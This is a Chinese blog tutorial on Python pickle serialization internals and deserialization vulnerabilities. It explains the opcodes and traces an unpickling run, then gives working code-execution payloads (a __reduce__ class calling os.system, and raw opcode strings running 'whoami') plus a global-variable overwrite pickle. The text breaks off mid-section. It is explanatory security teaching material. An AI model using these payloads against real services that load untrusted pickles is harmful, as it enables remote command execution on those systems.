        <content type="html"><![CDATA[<h2 id="基础知识"><a href="#基础知识" class="headerlink" title="基础知识"></a>基础知识</h2><h3 id="pickle库及函数"><a href="#pickle库及函数" class="headerlink" title="pickle库及函数"></a>pickle库及函数</h3><p>pickle是python语言的一个标准模块，实现了基本的数据序列化和反序列化。</p><p>常用的函数</p><table><thead><tr><th>函数</th><th>说明</th></tr></thead><tbody><tr><td>dumps</td><td>对象反序列化为bytes对象</td></tr><tr><td>dump</td><td>对象反序列化到文件对象，存入文件</td></tr><tr><td>loads</td><td>从bytes对象反序列化</td></tr><tr><td>load</td><td>对象反序列化，从文件中读取数据</td></tr></tbody></table><p>我们举例来看看</p><p>序列化</p><span id="more"></span><pre class=" language-python"><code class="language-python">pickle<span class="token punctuation">.</span>dump<span class="token punctuation">(</span><span class="token punctuation">)</span>方法将obj对象序列化为字节（bytes）写入到file文件中pickle<span class="token punctuation">.</span>dump<span class="token punctuation">(</span>obj<span class="token punctuation">,</span> file<span class="token punctuation">,</span> protocol<span class="token operator">=</span>None<span class="token punctuation">,</span> <span class="token operator">*</span><span class="token punctuation">,</span> fix_imports<span class="token operator">=</span><span class="token boolean">True</span><span class="token punctuation">)</span>pickle<span class="token punctuation">.</span>dumps<span class="token punctuation">(</span><span class="token punctuation">)</span>方法将obj对象序列化并返回一个bytes对象pickle<span class="token punctuation">.</span>dumps<span class="token punctuation">(</span>obj<span class="token punctuation">,</span> protocol<span class="token operator">=</span>None<span class="token punctuation">,</span> <span class="token operator">*</span><span class="token punctuation">,</span> fix_imports<span class="token operator">=</span><span class="token boolean">True</span><span class="token punctuation">)</span>pickle构造出的字符串，有很多个版本。在pickle<span class="token punctuation">.</span>dumps时，可以用Protocol参数指定协议版本，版本向前兼容</code></pre><p>反序列化</p><pre class=" language-python"><code class="language-python">pickle<span class="token punctuation">.</span>load<span class="token punctuation">(</span><span class="token punctuation">)</span>方法从file对象文件中读取序列化数据，将其反序列化之后返回一个对象pickle<span class="token punctuation">.</span>load<span class="token punctuation">(</span>file<span class="token punctuation">,</span> <span class="token operator">*</span><span class="token punctuation">,</span> fix_imports<span class="token operator">=</span><span class="token boolean">True</span><span class="token punctuation">,</span> encoding<span class="token operator">=</span><span class="token string">"ASCII"</span><span class="token punctuation">,</span> errors<span class="token operator">=</span><span class="token string">"strict"</span><span class="token punctuation">)</span>pickle<span class="token punctuation">.</span>loads<span class="token punctuation">(</span><span class="token punctuation">)</span>方法将bytes_object反序列化并返回一个对象pickle<span class="token punctuation">.</span>loads<span class="token punctuation">(</span>bytes_object<span class="token punctuation">,</span> <span class="token operator">*</span><span class="token punctuation">,</span> fix_imports<span class="token operator">=</span><span class="token boolean">True</span><span class="token punctuation">,</span> encoding<span class="token operator">=</span><span class="token string">"ASCII"</span><span class="token punctuation">,</span> errors<span class="token operator">=</span><span class="token string">"strict"</span><span class="token punctuation">)</span></code></pre><p>需要注意的一点：注意：对于我们自己定义的class，如果直接以 data&#x3D;’aaa’ 的方式赋初值，则这个date不会被打包，解决方案是写一个__init__()方法</p><pre class=" language-python"><code class="language-python"><span class="token keyword">import</span> pickle<span class="token keyword">class</span> <span class="token class-name">Test1</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    data <span class="token operator">=</span> <span class="token string">'aaa'</span>    <span class="token keyword">class</span> <span class="token class-name">Test2</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">def</span> <span class="token function">__init__</span><span class="token punctuation">(</span>self<span class="token punctuation">)</span><span class="token punctuation">:</span>        self<span class="token punctuation">.</span>data <span class="token operator">=</span> <span class="token string">'aaa'</span>test1 <span class="token operator">=</span> Test1<span class="token punctuation">(</span><span class="token punctuation">)</span>test2 <span class="token operator">=</span> Test2<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span>pickle<span class="token punctuation">.</span>dumps<span class="token punctuation">(</span>test1<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span>pickle<span class="token punctuation">.</span>dumps<span class="token punctuation">(</span>test2<span class="token punctuation">)</span><span class="token punctuation">)</span></code></pre><h3 id="Unpickler"><a href="#Unpickler" class="headerlink" title="_Unpickler"></a>_Unpickler</h3><p>pickle.load()和pickle.loads()方法的底层实现是基于 _Unpickler()方法来反序列化。</p><p>在反序列化过程中，<code>_Unpickler</code>（以下称为机器吧）维护了两个东西：栈区和存储区。结构如下（本图片仅为示意图）：</p><p><img src="https://bu.dusays.com/2021/10/30/251926d16a4f1.png"></p><p>为了研究它，也为了看懂那些乱七八糟的字符串，我们需要一个有力的调试器。这就是<code>pickletools</code>。</p><h3 id="pickletools"><a href="#pickletools" class="headerlink" title="pickletools"></a>pickletools</h3><p>pickletools是python自带的pickle调试器，有三个功能：<strong>反汇编</strong>一个已经被打包的字符串、<strong>优化</strong>一个已经被打包的字符串、返回一个迭代器来供程序使用。</p><p><img src="https://bu.dusays.com/2021/10/30/188615904cc96.png"></p><h3 id="PVM-python虚拟机"><a href="#PVM-python虚拟机" class="headerlink" title="PVM(python虚拟机)"></a>PVM(python虚拟机)</h3><p>当运行python程序的时候，python解释器会将源代码编译成字节码，然后交给 PVM 循环迭代字节码指令</p><p>字节码，如果python有写入的权限，那么会生成一个 .pyc 的字节码文件，若没有那就再内存中生成字节码，程序结束后丢弃。</p><p>在上图中字符串 s 是一串指令，学名叫PVM指令。</p><p>PVM指令集，用的时候可以查，在pickle库里</p><pre class=" language-python"><code class="language-python"><span class="token comment" spellcheck="true"># Pickle opcodes.  See pickletools.py for extensive docs.  The listing</span><span class="token comment" spellcheck="true"># here is in kind-of alphabetical order of 1-character pickle code.</span><span class="token comment" spellcheck="true"># pickletools groups them by purpose.</span>MARK           <span class="token operator">=</span> b<span class="token string">'('</span>   <span class="token comment" spellcheck="true"># push special markobject on stack</span>STOP           <span class="token operator">=</span> b<span class="token string">'.'</span>   <span class="token comment" spellcheck="true"># every pickle ends with STOP</span>POP            <span class="token operator">=</span> b<span class="token string">'0'</span>   <span class="token comment" spellcheck="true"># discard topmost stack item</span>POP_MARK       <span class="token operator">=</span> b<span class="token string">'1'</span>   <span class="token comment" spellcheck="true"># discard stack top through topmost markobject</span>DUP            <span class="token operator">=</span> b<span class="token string">'2'</span>   <span class="token comment" spellcheck="true"># duplicate top stack item</span>FLOAT          <span class="token operator">=</span> b<span class="token string">'F'</span>   <span class="token comment" spellcheck="true"># push float object; decimal string argument</span>INT            <span class="token operator">=</span> b<span class="token string">'I'</span>   <span class="token comment" spellcheck="true"># push integer or bool; decimal string argument</span>BININT         <span class="token operator">=</span> b<span class="token string">'J'</span>   <span class="token comment" spellcheck="true"># push four-byte signed int</span>BININT1        <span class="token operator">=</span> b<span class="token string">'K'</span>   <span class="token comment" spellcheck="true"># push 1-byte unsigned int</span>LONG           <span class="token operator">=</span> b<span class="token string">'L'</span>   <span class="token comment" spellcheck="true"># push long; decimal string argument</span>BININT2        <span class="token operator">=</span> b<span class="token string">'M'</span>   <span class="token comment" spellcheck="true"># push 2-byte unsigned int</span>NONE           <span class="token operator">=</span> b<span class="token string">'N'</span>   <span class="token comment" spellcheck="true"># push None</span>PERSID         <span class="token operator">=</span> b<span class="token string">'P'</span>   <span class="token comment" spellcheck="true"># push persistent object; id is taken from string arg</span>BINPERSID      <span class="token operator">=</span> b<span class="token string">'Q'</span>   <span class="token comment" spellcheck="true">#  "       "         "  ;  "  "   "     "  stack</span>REDUCE         <span class="token operator">=</span> b<span class="token string">'R'</span>   <span class="token comment" spellcheck="true"># apply callable to argtuple, both on stack</span>STRING         <span class="token operator">=</span> b<span class="token string">'S'</span>   <span class="token comment" spellcheck="true"># push string; NL-terminated string argument</span>BINSTRING      <span class="token operator">=</span> b<span class="token string">'T'</span>   <span class="token comment" spellcheck="true"># push string; counted binary string argument</span>SHORT_BINSTRING<span class="token operator">=</span> b<span class="token string">'U'</span>   <span class="token comment" spellcheck="true">#  "     "   ;    "      "       "      " &lt; 256 bytes</span>UNICODE        <span class="token operator">=</span> b<span class="token string">'V'</span>   <span class="token comment" spellcheck="true"># push Unicode string; raw-unicode-escaped'd argument</span>BINUNICODE     <span class="token operator">=</span> b<span class="token string">'X'</span>   <span class="token comment" spellcheck="true">#   "     "       "  ; counted UTF-8 string argument</span>APPEND         <span class="token operator">=</span> b<span class="token string">'a'</span>   <span class="token comment" spellcheck="true"># append stack top to list below it</span>BUILD          <span class="token operator">=</span> b<span class="token string">'b'</span>   <span class="token comment" spellcheck="true"># call __setstate__ or __dict__.update()</span>GLOBAL         <span class="token operator">=</span> b<span class="token string">'c'</span>   <span class="token comment" spellcheck="true"># push self.find_class(modname, name); 2 string args</span>DICT           <span class="token operator">=</span> b<span class="token string">'d'</span>   <span class="token comment" spellcheck="true"># build a dict from stack items</span>EMPTY_DICT     <span class="token operator">=</span> b<span class="token string">'&amp;#125;'</span>   # push empty dictAPPENDS        <span class="token operator">=</span> b<span class="token string">'e'</span>   <span class="token comment" spellcheck="true"># extend list on stack by topmost stack slice</span>GET            <span class="token operator">=</span> b<span class="token string">'g'</span>   <span class="token comment" spellcheck="true"># push item from memo on stack; index is string arg</span>BINGET         <span class="token operator">=</span> b<span class="token string">'h'</span>   <span class="token comment" spellcheck="true">#   "    "    "    "   "   "  ;   "    " 1-byte arg</span>INST           <span class="token operator">=</span> b<span class="token string">'i'</span>   <span class="token comment" spellcheck="true"># build &amp; push class instance</span>LONG_BINGET    <span class="token operator">=</span> b<span class="token string">'j'</span>   <span class="token comment" spellcheck="true"># push item from memo on stack; index is 4-byte arg</span>LIST           <span class="token operator">=</span> b<span class="token string">'l'</span>   <span class="token comment" spellcheck="true"># build list from topmost stack items</span>EMPTY_LIST     <span class="token operator">=</span> b<span class="token string">']'</span>   <span class="token comment" spellcheck="true"># push empty list</span>OBJ            <span class="token operator">=</span> b<span class="token string">'o'</span>   <span class="token comment" spellcheck="true"># build &amp; push class instance</span>PUT            <span class="token operator">=</span> b<span class="token string">'p'</span>   <span class="token comment" spellcheck="true"># store stack top in memo; index is string arg</span>BINPUT         <span class="token operator">=</span> b<span class="token string">'q'</span>   <span class="token comment" spellcheck="true">#   "     "    "   "   " ;   "    " 1-byte arg</span>LONG_BINPUT    <span class="token operator">=</span> b<span class="token string">'r'</span>   <span class="token comment" spellcheck="true">#   "     "    "   "   " ;   "    " 4-byte arg</span>SETITEM        <span class="token operator">=</span> b<span class="token string">'s'</span>   <span class="token comment" spellcheck="true"># add key+value pair to dict</span>TUPLE          <span class="token operator">=</span> b<span class="token string">'t'</span>   <span class="token comment" spellcheck="true"># build tuple from topmost stack items</span>EMPTY_TUPLE    <span class="token operator">=</span> b<span class="token string">')'</span>   <span class="token comment" spellcheck="true"># push empty tuple</span>SETITEMS       <span class="token operator">=</span> b<span class="token string">'u'</span>   <span class="token comment" spellcheck="true"># modify dict by adding topmost key+value pairs</span>BINFLOAT       <span class="token operator">=</span> b<span class="token string">'G'</span>   <span class="token comment" spellcheck="true"># push float; arg is 8-byte float encoding</span>TRUE           <span class="token operator">=</span> b<span class="token string">'I01\n'</span>  <span class="token comment" spellcheck="true"># not an opcode; see INT docs in pickletools.py</span>FALSE          <span class="token operator">=</span> b<span class="token string">'I00\n'</span>  <span class="token comment" spellcheck="true"># not an opcode; see INT docs in pickletools.py</span><span class="token comment" spellcheck="true"># Protocol 2</span>PROTO          <span class="token operator">=</span> b<span class="token string">'\x80'</span>  <span class="token comment" spellcheck="true"># identify pickle protocol</span>NEWOBJ         <span class="token operator">=</span> b<span class="token string">'\x81'</span>  <span class="token comment" spellcheck="true"># build object by applying cls.__new__ to argtuple</span>EXT1           <span class="token operator">=</span> b<span class="token string">'\x82'</span>  <span class="token comment" spellcheck="true"># push object from extension registry; 1-byte index</span>EXT2           <span class="token operator">=</span> b<span class="token string">'\x83'</span>  <span class="token comment" spellcheck="true"># ditto, but 2-byte index</span>EXT4           <span class="token operator">=</span> b<span class="token string">'\x84'</span>  <span class="token comment" spellcheck="true"># ditto, but 4-byte index</span>TUPLE1         <span class="token operator">=</span> b<span class="token string">'\x85'</span>  <span class="token comment" spellcheck="true"># build 1-tuple from stack top</span>TUPLE2         <span class="token operator">=</span> b<span class="token string">'\x86'</span>  <span class="token comment" spellcheck="true"># build 2-tuple from two topmost stack items</span>TUPLE3         <span class="token operator">=</span> b<span class="token string">'\x87'</span>  <span class="token comment" spellcheck="true"># build 3-tuple from three topmost stack items</span>NEWTRUE        <span class="token operator">=</span> b<span class="token string">'\x88'</span>  <span class="token comment" spellcheck="true"># push True</span>NEWFALSE       <span class="token operator">=</span> b<span class="token string">'\x89'</span>  <span class="token comment" spellcheck="true"># push False</span>LONG1          <span class="token operator">=</span> b<span class="token string">'\x8a'</span>  <span class="token comment" spellcheck="true"># push long from &lt; 256 bytes</span>LONG4          <span class="token operator">=</span> b<span class="token string">'\x8b'</span>  <span class="token comment" spellcheck="true"># push really big long</span>_tuplesize2code <span class="token operator">=</span> <span class="token punctuation">[</span>EMPTY_TUPLE<span class="token punctuation">,</span> TUPLE1<span class="token punctuation">,</span> TUPLE2<span class="token punctuation">,</span> TUPLE3<span class="token punctuation">]</span><span class="token comment" spellcheck="true"># Protocol 3 (Python 3.x)</span>BINBYTES       <span class="token operator">=</span> b<span class="token string">'B'</span>   <span class="token comment" spellcheck="true"># push bytes; counted binary string argument</span>SHORT_BINBYTES <span class="token operator">=</span> b<span class="token string">'C'</span>   <span class="token comment" spellcheck="true">#  "     "   ;    "      "       "      " &lt; 256 bytes</span><span class="token comment" spellcheck="true"># Protocol 4</span>SHORT_BINUNICODE <span class="token operator">=</span> b<span class="token string">'\x8c'</span>  <span class="token comment" spellcheck="true"># push short string; UTF-8 length &lt; 256 bytes</span>BINUNICODE8      <span class="token operator">=</span> b<span class="token string">'\x8d'</span>  <span class="token comment" spellcheck="true"># push very long string</span>BINBYTES8        <span class="token operator">=</span> b<span class="token string">'\x8e'</span>  <span class="token comment" spellcheck="true"># push very long bytes string</span>EMPTY_SET        <span class="token operator">=</span> b<span class="token string">'\x8f'</span>  <span class="token comment" spellcheck="true"># push empty set on the stack</span>ADDITEMS         <span class="token operator">=</span> b<span class="token string">'\x90'</span>  <span class="token comment" spellcheck="true"># modify set by adding topmost stack items</span>FROZENSET        <span class="token operator">=</span> b<span class="token string">'\x91'</span>  <span class="token comment" spellcheck="true"># build frozenset from topmost stack items</span>NEWOBJ_EX        <span class="token operator">=</span> b<span class="token string">'\x92'</span>  <span class="token comment" spellcheck="true"># like NEWOBJ but work with keyword only arguments</span>STACK_GLOBAL     <span class="token operator">=</span> b<span class="token string">'\x93'</span>  <span class="token comment" spellcheck="true"># same as GLOBAL but using names on the stacks</span>MEMOIZE          <span class="token operator">=</span> b<span class="token string">'\x94'</span>  <span class="token comment" spellcheck="true"># store top of the stack in memo</span>FRAME            <span class="token operator">=</span> b<span class="token string">'\x95'</span>  <span class="token comment" spellcheck="true"># indicate the beginning of a new frame</span><span class="token comment" spellcheck="true"># Protocol 5</span>BYTEARRAY8       <span class="token operator">=</span> b<span class="token string">'\x96'</span>  <span class="token comment" spellcheck="true"># push bytearray</span>NEXT_BUFFER      <span class="token operator">=</span> b<span class="token string">'\x97'</span>  <span class="token comment" spellcheck="true"># push next out-of-band buffer</span>READONLY_BUFFER  <span class="token operator">=</span> b<span class="token string">'\x98'</span>  <span class="token comment" spellcheck="true"># make top of stack readonly</span></code></pre><p>列出几个比较重要的操作码：</p><blockquote><pre class=" language-text"><code class="language-text">c : 读取本行的内容作为模块名module, 读取下一行的内容作为对象名object，然后将 module.object 作为可调用对象压入到栈中( : 将一个标记对象压入到栈中 , 用于确定命令执行的位置，该标记常常搭配 t 指令一起使用 , 以便产生一个元组S : 后面跟字符串 , PVM会读取引号中的内容 , 直到遇见换行符 , 然后将读取到的内容压入到栈中t : 从栈中不断弹出数据 , 弹射顺序与压栈时相同 , 直到弹出左括号，此时弹出的内容形成了一个元组 , 然后 , 该元组会被压入栈中R : 将之前压入栈中的元组和可调用对象全部弹出 , 然后将该元组作为可调用参数的对象并执行该对象 。最后将结果压入到栈中. : 结束整个 Pickle 反序列化过程</code></pre></blockquote><p><strong>注意：PVM 指令的书写规范</strong><br>(1)操作码是单字节的<br>(2)带参数的指令用换行符定界</p><h3 id="OPCode-操作码"><a href="#OPCode-操作码" class="headerlink" title="OPCode(操作码)"></a>OPCode(操作码)</h3><p>在py3和py2中得到的opcode不相同，但pickle向下前兼容，所以我们可以用v0版本。</p><h3 id="Python-参数前的（-）和（-）"><a href="#Python-参数前的（-）和（-）" class="headerlink" title="Python 参数前的（*）和（**）"></a><a href="https://www.runoob.com/w3cnote/python-one-and-two-star.html">Python 参数前的（*）和（**）</a></h3><p>这两种用法其实都是用来将任意个数的参数导入到 Python 函数中。</p><p>一个(*)–将所有参数以元组的形式导入</p><p>两个(**)–将所有参数以字典的形式导入</p><p>两个方法也可以用在一个函数。</p><p><a href="https://www.cnblogs.com/xueweisuoyong/p/11891310.html#">不定长传参</a></p><h2 id="反序列化过程分析"><a href="#反序列化过程分析" class="headerlink" title="反序列化过程分析"></a>反序列化过程分析</h2><pre class=" language-python"><code class="language-python"><span class="token keyword">import</span> pickle<span class="token punctuation">,</span>pickletools<span class="token keyword">class</span> <span class="token class-name">Test1</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">def</span> <span class="token function">__init__</span><span class="token punctuation">(</span>self<span class="token punctuation">)</span><span class="token punctuation">:</span>        self<span class="token punctuation">.</span>data <span class="token operator">=</span> <span class="token string">'lees'</span>test1 <span class="token operator">=</span> Test1<span class="token punctuation">(</span><span class="token punctuation">)</span>s <span class="token operator">=</span> pickle<span class="token punctuation">.</span>dumps<span class="token punctuation">(</span>test1<span class="token punctuation">,</span>protocol<span class="token operator">=</span><span class="token number">3</span><span class="token punctuation">)</span>s <span class="token operator">=</span> pickletools<span class="token punctuation">.</span>optimize<span class="token punctuation">(</span>s<span class="token punctuation">)</span><span class="token comment" spellcheck="true">#优化字符串，也就是去掉不必要的 PUT指令----PUT意思是把当前栈的栈顶复制一份，放进储存区</span><span class="token keyword">print</span><span class="token punctuation">(</span>s<span class="token punctuation">)</span>pickletools<span class="token punctuation">.</span>dis<span class="token punctuation">(</span>s<span class="token punctuation">)</span><span class="token comment" spellcheck="true">#反汇编</span></code></pre><pre class=" language-text"><code class="language-text">b'\x80\x03c__main__\nTest1\n)\x81&#125;X\x04\x00\x00\x00dataX\x04\x00\x00\x00leessb.'</code></pre><p>\x80–接收pickle的版本，这里为\x03</p><p>c–读取一行作为模块名__main__，再读取一行作为类名Test1，再通过find_class()获取到Test1对象，并压入stack栈</p><pre class=" language-text"><code class="language-text">stack:[<class '__main__.Test1'>]</code></pre><p>)–压入一个空元组到stack栈中</p><pre class=" language-text"><code class="language-text">stack:[<class '__main__.Test1'>,()]</code></pre><p>\x81–从栈弹出两个数据，()赋值给args，&lt;class ‘__main__.Test1’&gt;赋值给cls，再通过<a href="https://blog.csdn.net/claroja/article/details/107056407">__new__()</a>实例化对象，并压入stack栈中</p><pre class=" language-text"><code class="language-text">stack:[<class '__main__.Test1'>]</code></pre><p>}–压入一个空字典到栈里</p><pre class=" language-text"><code class="language-text">stack:[<class '__main__.Test1'>,&#123;&#125;]</code></pre><p>X–接收字符串的长度，这里为\x04\x00\x00\x00接收到data，\x04\x00\x00\x00接收到lees，都存入栈中</p><pre class=" language-text"><code class="language-text">stack:[<class '__main__.Test1'>,&#123;&#125;,data,lees]</code></pre><p>s–弹出两个数据，存入那个空字典中，并压入栈</p><pre class=" language-text"><code class="language-text">stack:[<class '__main__.Test1'>,&#123;'data':'lees'&#125;]</code></pre><p>b–弹出 {‘data’:’lees’} 给state，弹出 &lt;class ‘__main__.Test1’&gt; 给inst，如果inst中存在__setstate__方法，则直接用<a href="https://blog.csdn.net/jiang_huixin/article/details/109674221">setstate</a>来处理state，setstate(state)，如果不存在，则直接将state存入inst.__dict__中。</p><pre class=" language-text"><code class="language-text">stack:[]</code></pre><p>.–结束反序列化。</p><h2 id="反序列化漏洞利用"><a href="#反序列化漏洞利用" class="headerlink" title="反序列化漏洞利用"></a>反序列化漏洞利用</h2><p>从上面的例子可以看出反序列化的过程完全可控，因此我们可以构造pickle，我们可以根据实例来理解构造的payload。</p><h3 id="reduce"><a href="#reduce" class="headerlink" title="__reduce__()"></a>__reduce__()</h3><p>python序列化主要有三个过程：从对象中提取所有属性——》写入对象的所有模块名和类名——》写入对象所有属性的键值对。python反序列化漏洞的产生和php的魔术方法有异曲同工之处，在Python2中的 __reduce__() 方法，会在每次的反序列化开始或结束时调用。它的指令码是<code>R</code>。</p><pre class=" language-test"><code class="language-test">__reduce__()方法在新式类中生效，不带参数，应返回字符串或一个元组。如果返回一个字符串，该字符串应该被解释为全局变量的名称，它应该是对象相对于其模块的本地名称。当返回一个元组时，它必须包含两到五个成员。可选成员可以省略，也可以提供None作为其值。每个成员的意义是按顺序规定的：第一个成员，将被调用的对象，callable。第二个成员，可调用对象的参数的元组。如果callable不接受任何参数，则必须给出一个空元组。当Python定义的类中的__reduce__函数返回的元组包含危险代码或可控，就会造成代码执行。</code></pre><p>payload:</p><pre class=" language-python"><code class="language-python"><span class="token keyword">import</span> pickle<span class="token keyword">import</span> os<span class="token keyword">class</span> <span class="token class-name">A</span><span class="token punctuation">(</span>object<span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">def</span> <span class="token function">__reduce__</span><span class="token punctuation">(</span>self<span class="token punctuation">)</span><span class="token punctuation">:</span>        <span class="token keyword">return</span> <span class="token punctuation">(</span>os<span class="token punctuation">.</span>system<span class="token punctuation">,</span><span class="token punctuation">(</span><span class="token string">'ls /'</span><span class="token punctuation">,</span><span class="token punctuation">)</span><span class="token punctuation">)</span>a <span class="token operator">=</span> A<span class="token punctuation">(</span><span class="token punctuation">)</span>test <span class="token operator">=</span> pickle<span class="token punctuation">.</span>dumps<span class="token punctuation">(</span>a<span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span>pickle<span class="token punctuation">.</span>loads<span class="token punctuation">(</span>test<span class="token punctuation">)</span><span class="token punctuation">)</span></code></pre><p>（reduce一次只能执行一个函数，当exec被禁用时，就不能一次执行多条指令了）</p><h3 id="全局变量覆盖"><a href="#全局变量覆盖" class="headerlink" title="全局变量覆盖"></a>全局变量覆盖</h3><pre class=" language-python"><code class="language-python"><span class="token keyword">import</span> pickle<span class="token keyword">import</span> secret<span class="token keyword">class</span> <span class="token class-name">Test1</span><span class="token punctuation">:</span>    <span class="token keyword">def</span> <span class="token function">__init__</span><span class="token punctuation">(</span>self<span class="token punctuation">)</span><span class="token punctuation">:</span>        self<span class="token punctuation">.</span>animal<span class="token operator">=</span><span class="token string">"lees"</span>    <span class="token keyword">def</span> <span class="token function">check</span><span class="token punctuation">(</span>self<span class="token punctuation">)</span><span class="token punctuation">:</span>        <span class="token keyword">if</span> self<span class="token punctuation">.</span>animal<span class="token operator">==</span>secret<span class="token punctuation">.</span>best<span class="token punctuation">:</span>            <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"good!"</span><span class="token punctuation">)</span>code<span class="token operator">=</span><span class="token string">"your code"</span>pickle<span class="token punctuation">.</span>loads<span class="token punctuation">(</span>code<span class="token punctuation">)</span></code></pre><p>在这个例子中，我们是不知道secret模块的，但在Test1类中有要进行判断才能输出good，所以我们只要修改secret的best为lees即可。我们导入一个模块会进入内存，然后我们在内存重构secret使之等于lees。</p><p>c操作符调用find_class()来获取对象，而模块、属性都可控，那可以构造payload为：</p><pre class=" language-text"><code class="language-text">code=b'\x80\x03c__main__\nsecret\n&#125;X\x04\x00\x00\x00bestX\x04\x00\x00\x00leessb0c__main__\nTest1\n)\x81&#125;X\x04\x00\x00\x00nameX\x04\x00\x00\x00leessb.'</code></pre><h3 id="函数执行"><a href="#函数执行" class="headerlink" title="函数执行"></a>函数执行</h3><p>与函数执行的操作码有<code>i、R、o、b</code></p><ul><li>i操作码</li></ul><pre class=" language-python"><code class="language-python"><span class="token keyword">def</span> <span class="token function">load_inst</span><span class="token punctuation">(</span>self<span class="token punctuation">)</span><span class="token punctuation">:</span>    module <span class="token operator">=</span> self<span class="token punctuation">.</span>readline<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token punctuation">:</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">.</span>decode<span class="token punctuation">(</span><span class="token string">"ascii"</span><span class="token punctuation">)</span>    name <span class="token operator">=</span> self<span class="token punctuation">.</span>readline<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token punctuation">:</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">.</span>decode<span class="token punctuation">(</span><span class="token string">"ascii"</span><span class="token punctuation">)</span>    klass <span class="token operator">=</span> self<span class="token punctuation">.</span>find_class<span class="token punctuation">(</span>module<span class="token punctuation">,</span> name<span class="token punctuation">)</span>    self<span class="token punctuation">.</span>_instantiate<span class="token punctuation">(</span>klass<span class="token punctuation">,</span> self<span class="token punctuation">.</span>pop_mark<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span>dispatch<span class="token punctuation">[</span>INST<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">]</span> <span class="token operator">=</span> load_inst<span class="token comment" spellcheck="true">#通过find_class获取方法（os.system），再通过pop_mark获得参数（whomai），并通过_instantiate来执行</span></code></pre><pre class=" language-python"><code class="language-python"><span class="token keyword">def</span> <span class="token function">pop_mark</span><span class="token punctuation">(</span>self<span class="token punctuation">)</span><span class="token punctuation">:</span>    items <span class="token operator">=</span> self<span class="token punctuation">.</span>stack    self<span class="token punctuation">.</span>stack <span class="token operator">=</span> self<span class="token punctuation">.</span>metastack<span class="token punctuation">.</span>pop<span class="token punctuation">(</span><span class="token punctuation">)</span>    self<span class="token punctuation">.</span>append <span class="token operator">=</span> self<span class="token punctuation">.</span>stack<span class="token punctuation">.</span>append    <span class="token keyword">return</span> items<span class="token comment" spellcheck="true">#获取stack栈所有为item，然后弹出metastack栈赋值给stack栈，返回item</span></code></pre><pre class=" language-python"><code class="language-python"><span class="token keyword">def</span> <span class="token function">load_mark</span><span class="token punctuation">(</span>self<span class="token punctuation">)</span><span class="token punctuation">:</span>    self<span class="token punctuation">.</span>metastack<span class="token punctuation">.</span>append<span class="token punctuation">(</span>self<span class="token punctuation">.</span>stack<span class="token punctuation">)</span>    self<span class="token punctuation">.</span>stack <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span>    self<span class="token punctuation">.</span>append <span class="token operator">=</span> self<span class="token punctuation">.</span>stack<span class="token punctuation">.</span>appenddispatch<span class="token punctuation">[</span>MARK<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">]</span> <span class="token operator">=</span> load_mark<span class="token comment" spellcheck="true"># ( 操作符</span></code></pre><p>payload:</p><pre class=" language-text"><code class="language-text">b'(X\x06\x00\x00\x00whoamiios\nsystem\n.'利用 ( 先将whoami存到metastack栈中，在执行 i 操作</code></pre><ul><li>R操作码</li></ul><pre class=" language-python"><code class="language-python"><span class="token keyword">def</span> <span class="token function">load_reduce</span><span class="token punctuation">(</span>self<span class="token punctuation">)</span><span class="token punctuation">:</span>    stack <span class="token operator">=</span> self<span class="token punctuation">.</span>stack    args <span class="token operator">=</span> stack<span class="token punctuation">.</span>pop<span class="token punctuation">(</span><span class="token punctuation">)</span>    func <span class="token operator">=</span> stack<span class="token punctuation">[</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">]</span>    stack<span class="token punctuation">[</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">]</span> <span class="token operator">=</span> func<span class="token punctuation">(</span><span class="token operator">*</span>args<span class="token punctuation">)</span>dispatch<span class="token punctuation">[</span>REDUCE<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">]</span> <span class="token operator">=</span> load_reduce<span class="token comment" spellcheck="true">#弹出一个数据作为参数（必须是元组），当前stack栈最后一个数据作为函数并执行</span></code></pre><pre class=" language-python"><code class="language-python"><span class="token keyword">def</span> <span class="token function">load_tuple1</span><span class="token punctuation">(</span>self<span class="token punctuation">)</span><span class="token punctuation">:</span>    self<span class="token punctuation">.</span>stack<span class="token punctuation">[</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token punctuation">(</span>self<span class="token punctuation">.</span>stack<span class="token punctuation">[</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">,</span><span class="token punctuation">)</span>dispatch<span class="token punctuation">[</span>TUPLE1<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">]</span> <span class="token operator">=</span> load_tuple1<span class="token comment" spellcheck="true">#\x85将最后一个数据改成元组形式并压到stack栈</span></code></pre><p>payload：</p><pre class=" language-text"><code class="language-text">b'cos\nsystem\nX\x06\x00\x00\x00whoami\x85R.'</code></pre><ul><li>o操作码</li></ul><pre class=" language-python"><code class="language-python"><span class="token keyword">def</span> <span class="token function">load_obj</span><span class="token punctuation">(</span>self<span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token comment" spellcheck="true"># Stack is ... markobject classobject arg1 arg2 ...</span>    args <span class="token operator">=</span> self<span class="token punctuation">.</span>pop_mark<span class="token punctuation">(</span><span class="token punctuation">)</span>    cls <span class="token operator">=</span> args<span class="token punctuation">.</span>pop<span 